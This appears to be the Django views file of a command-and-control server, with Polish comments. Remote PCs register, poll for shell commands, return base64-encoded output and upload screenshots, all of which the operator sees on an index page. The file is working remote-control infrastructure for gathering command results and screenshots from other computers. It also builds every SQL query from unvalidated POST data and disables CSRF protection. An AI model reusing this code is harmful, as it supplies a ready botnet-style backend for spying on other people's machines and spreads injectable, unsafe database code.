# -*- coding: utf-8 -*-

from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
#from django.db import connection, InterfaceError
#from django.utils.safestring import mark_safe
from django.core.files.storage import FileSystemStorage
#from django.db.utils import InterfaceError
from .dbask import db_fetchall, db_fetchone, db_update
from .timediff import get_diff
import random
import string
import re
import base64
import os
import sys
import time


base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


"""

Index function - main site, with database of associated PC's.
From this, also is possible to execute functions.

"""

def index(request):
    # Get associated PC's lists
    host_list = db_fetchall('SELECT * FROM users2')
    mac_list = db_fetchall('SELECT det_mac FROM users2')
    # List to str because in index.html file there is no possibility to check that x is in list
    print(host_list)
    print(mac_list)
    # Unwanted chars from list of macs - necessary to generate folder name for specific PC / list of folder names
    unw_chars = ['\'', '(', ')', ',']
    mac_w_files = []
    # Get mac from mac list
    time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
    time_list = []
    for i in range(0, 300):
        time_list.append(i)
    time_list_str = str(time_list)
    for mac in mac_list:
        print('drukuje mac')
        print(mac)
        # Get character in specific mac
        for ch in mac:
            filt_mac = (''.join(c for c in ch if c not in unw_chars))
            print('drukuje filt mac')
            print(filt_mac)
            la_db = (''.join(c for c in (str(db_fetchone('SELECT last_activity FROM users2 WHERE det_mac = \'%s\'' % filt_mac))) if c not in unw_chars))
            #print('DRUK LADB')
            #print(la_db)
            #time.sleep(10)
            la_diff = get_diff(time_curr, la_db)
            #if la_db is string:
            db_update('UPDATE users2 SET la_diff = \'%s\' WHERE det_mac = \'%s\'' % (la_diff, filt_mac))
            # If folder with filtered mac name exists, update DB
            #if os.path.isdir('%s\media\client_ups\%s' % (base_dir, filt_mac)) == True:
            if os.path.isdir('%s/media/client_ups/%s' % (base_dir, filt_mac)) == True:
                #mac_clear = (''.join(c for c in mac if c not in unw_chars))
                db_update('UPDATE users2 SET files = \'%s\' WHERE det_mac = \'%s\'' % (filt_mac , filt_mac))
            else:
                pass

    return render(request, 'index.html', {'host_list' : host_list, 'mac_list' : mac_list,'time_curr' : time_curr,
                                          'time_list_str' : time_list_str})


"""

Function join - only for test purposes, to add PC manually to list.

"""

@csrf_exempt
def join(request):
    return render(request, 'join.html', {})


"""

Register - function that allows to add remote PC to database,
or update old information.

"""


@csrf_exempt
def register(request):
    #print(request.method)
    if request.method == 'POST':
        print('==== HOST PRZEDSTAWIA SIE ====')
        for key, value in request.POST.items():
            print(key + ' : ' + value)
        # Check that connecting PC is new or not
        is_new = str(db_fetchone('SELECT * FROM users2 WHERE det_mac = \'%s\'' % request.POST.get('det_mac')))
        #print('DRUKUJE ISNEW')
        #print(is_new)
        #time.sleep(15)
        if is_new == 'None':
            db_update('INSERT INTO users2 (det_mac, det_os, det_name, det_int_ip, det_ext_ip) VALUES (\'%s\', \'%s\', \'%s\', \'%s\', \'%s\')'
                    % (request.POST.get('det_mac'), request.POST.get('det_os'), request.POST.get('det_name'),
                    request.POST.get('det_int_ip'), request.POST.get('det_ext_ip')))
            #if not os.path.exists('%s\media\client_ups\%s' % (base_dir, (request.POST.get('det_mac')))):
                #os.makedirs('%s\media\client_ups\%s' % (base_dir, (request.POST.get('det_mac'))))
            if not os.path.exists('%s/media/client_ups/%s' % (base_dir, (request.POST.get('det_mac')))):
                os.makedirs('%s/media/client_ups/%s' % (base_dir, (request.POST.get('det_mac'))))
            else:
                pass
            print('++++ DODALEM NOWY PC DO BAZY ++++')
            return HttpResponse('Dodano PC %s do DB' % request.POST.get('det_mac'))
        elif (request.POST.get('det_mac') in is_new) and ((request.POST.get('det_int_ip')
                                                           or request.POST.get('det_ext_ip')) not in is_new):
            db_update('UPDATE users2 SET det_os = \'%s\', det_name = \'%s\', det_int_ip = \'%s\', det_ext_ip = \'%s\' WHERE det_mac = \'%s\''
                               % (request.POST.get('det_os'), request.POST.get('det_name'), request.POST.get('det_int_ip'),
                                request.POST.get('det_ext_ip'), request.POST.get('det_mac')))
            return HttpResponse('Zaktualizowano PC %s w DB' % request.POST.get('det_mac'))
        else:
            print('++++ NIE JESTES NOWY, TAKI MAC JEST W BAZIE ++++')
            #dbquery.close()
            return HttpResponse('PC %s istnieje już w DB.' % request.POST.get('det_mac'))

    else:
        return HttpResponse('No i gdzie te dane z POST?')


"""

Function command - add record to DB with some unique identificator,
command to be executed and mac(s) - for apply this command on remote PC,
when PC request for order page.

"""


@csrf_exempt
def command(request):

    """

    Every time when new command must be executed on remote PC's,
    the new uniqueid is generated. This should prevent to duplicate executing
    commands on remote PC's

    """

    def get_unique_id(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))
    if request.method == 'POST':
        #com_params =[]
        selected_users = []
        new_uniqueid = str(get_unique_id())
        print('++++ NOWE uniqueid W ZWIAZKU Z NOWA KOMENDA ++++')
        print(new_uniqueid)
        print('++++ DRUKUJE KOMENDE I PARAMETRY ++++')
        for key, value in request.POST.items():
            #com_params.append(value)
            print(key + ' : ' + value)
        #print(com_params)
        # There is command, that allow to delete user by CC center
            if 'det_mac' in key:
                db_update('UPDATE users2 SET uniqueid = \'%s\', command = \'%s\' WHERE det_mac = \'%s\''
                            % (new_uniqueid, request.POST.get('command'), request.POST.get(key)))
                selected_users.append(request.POST.get(key))
                if 'deluser' in request.POST.get('command'):
                    print('++++ USUWAM USERA %s Z DB ++++' % request.POST.get('det_mac'))
                    db_update('DELETE from users2 WHERE det_mac = \'%s\'' % request.POST.get(key))
                else:
                    pass
            else:
                pass
        # Otherwise, add some records to DB and generate site (generated site is only for information purposes)
        db_update('UPDATE lastuniqueid SET uniqueid = \'%s\' WHERE uniqueid LIKE \'______\'' % new_uniqueid)
        return HttpResponse('%s;%s;%s' % (new_uniqueid, request.POST.get('command'), selected_users))
    else:
        return HttpResponse('Przeciez POST jest pusty...')


"""

Most complicated function here :) Get result of executed command from remote PC.
Important: this is used for transfer only text data.

"""


@csrf_exempt
def result(request):
    if request.method == 'POST':
        # Res params list is used for get result and last activity and store them. Rest of data is in POST dict.
        res_params = {}
        print('=== HOST PRZESYLA REZULTAT KOMENDY ====')
        for key, value in request.POST.items():
            print(key + ' : ' + value)
            if 'result' in key:
                print('++++ MAM KEY ++++')
                print(value)
                # Decode data received as result, because the data is encoded
                value_enc = (base64.b64decode(value.encode()))
                value = str(value_enc)
                print('++++ DRUKUJE REZULTAT ODKODOWANY ++++')
                print(value_enc)
                # Cut off bytes symbol in decoded result, and clean from slashes automatically added by python
                if 'b\"' in value:
                    value = str((re.search('b\"(.*)\"', str(value_enc)).group(1))).replace('\\\\\\\\', '\\')
                    print('++++ DRUKUJE DO PRZEKAZANIA DALEJ Z FILTREM DLA BINARY ++++')
                    print(value)
                    # If result is a multiple-line output, there is necessary to replace rn to html tag (nice look)
                    if '\\\\r\\\\n' in value:
                        print('++++ DRUKUJE WARTOSC Z FILTREM DLA BINARY I RN ++++')
                        print(value)
                        value_filter = (
                            (re.search('stdout=b\'(.*)\'\)', str(value)).group(1)).replace('\\\\r\\\\n', '<br>').replace(
                                '<DIR>', '=DIR='))
                        print('++++ DRUKUJE CZYSTY REZULTAT Z FILTRAMI DO DB ++++')
                        print(value_filter)
                        res_params['result']= value_filter
                    else:
                        pass
                # Sometimes, the output comes with a other apostrophe ??? (IDK why??)
                elif 'b\'' in value:
                    value = str((re.search('b\'(.*)\'', str(value_enc)).group(1)))
                    print('++++ DRUKUJE DO PRZEKAZANIA DALEJ Z FILTREM DLA BINARY ++++')
                    print(value)
                    res_params['result'] = (value + ' (Executed)')
                else:
                    pass
            elif 'last_activity' in key:
                # Add second parameter to list - last activity, which also was send by remote PC
                res_params['last_activity']= value
            else:
                pass
        print('++++ DRUKUJE PARAMETRY DO ZAPISU DO DB ++++')
        print(res_params)
        # Adding result to database
        db_update(
                'UPDATE users2 SET result = \'%s\', last_activity = \'%s\' WHERE det_mac = \'%s\' AND uniqueid = \'%s\'' %
                           (res_params.get('result'), res_params.get('last_activity'), request.POST.get('det_mac'), request.POST.get('uniqueid')))
        # Return result on generated site - only for information purposes
        return HttpResponse('%s, %s, %s, %s' % (res_params.get('result'), res_params.get('last_activity'), request.POST.get('det_mac'), request.POST.get('uniqueid')))
    else:
        return HttpResponse('POST pusty, przeslij jeszcze raz!')



"""

Function generate order page, for remote PC, which try to get
current command and other data from CC server.
The data was generated earlier by command function.

"""


@csrf_exempt
def order(request):
    if request.method == 'POST':
        print('==== REQUEST PO AKTUALNA KOMENDE I uniqueid =====')
        #curr_uniqueid = db_fetchone('SELECT * from lastuniqueid')
        curr_uniqueid = re.search('\(\'(.*)\',\)', str(db_fetchone('SELECT * from lastuniqueid'))).group(1)
        print(curr_uniqueid)
        command = db_fetchall\
            ('SELECT command FROM users2 WHERE uniqueid = \'%s\' AND det_mac =\'%s\'' % (curr_uniqueid, request.POST.get('det_mac')))
        #print(mac_group)
        return HttpResponse('%s, %s, %s' % (curr_uniqueid, request.POST.get('det_mac'), command))


"""

When the host check order page, and there is unknow command or no-mac,
PC send a ping signal, that means, that remote PC is in IDDLE mode.
Important: this is only one function, that have other name and url
(see urls.py - ping / last_activity).

"""


@csrf_exempt
def last_activity(request):
    if request.method == 'POST':
        #la_parameters = []
        print('==== OTRZYMUJE PING OD HOSTA ====')
        for key, value in request.POST.items():
            #la_parameters.append(value)
            print(key + ' : ' + value)
        db_update('UPDATE users2 SET last_activity = \'%s\' WHERE det_mac = \'%s\''
                            % (request.POST.get('last_activity'), request.POST.get('det_mac')))
        return HttpResponse('%s, %s' % (request.POST.get('last_activity'), request.POST.get('det_mac')))
    else:
        return HttpResponse('Serio? Pusty POST?')


"""

Upload site, is only for upload screenshots from remote PC.
Many of this informations about processing files was found on stackoverflow.

"""


@csrf_exempt
def upload(request):
    if request.method == 'POST' and request.FILES['file']:
        file = request.FILES['file']
        #print(str(file))
        # Procedure which save file in specific folder
        #fs = FileSystemStorage(location=('%s\media\client_ups\%s' % (base_dir, request.POST.get('det_mac'))))
        fs = FileSystemStorage(location=('%s/media/client_ups/%s' % (base_dir, (request.POST.get('det_mac')))))
        filename = fs.save(file.name, file)
        print('==== OTRZYMALEM PLIK ====')
        for key, value in request.POST.items():
            print(key + ' : ' + value)
        print(filename)
        # Page generated only for test purposes
        return HttpResponse('Otrzymano plik %s od %s' % (filename, request.POST.get('det_mac')))
    else:
        return HttpResponse('Dane POST znow nieprzeslane!')

"""

Because tehere was problems with directory listing via django,
the special procedure to generate list of files on webpage was included.

"""


@csrf_exempt
def listfiles(request, folder):
    #files = os.listdir('%s\media\client_ups\%s' % (base_dir, folder))
    files = os.listdir('%s/media/client_ups/%s' % (base_dir, folder))
    # Render a webpage with links to files
    return render(request, 'files.html', {'files' : files, 'folder' : folder})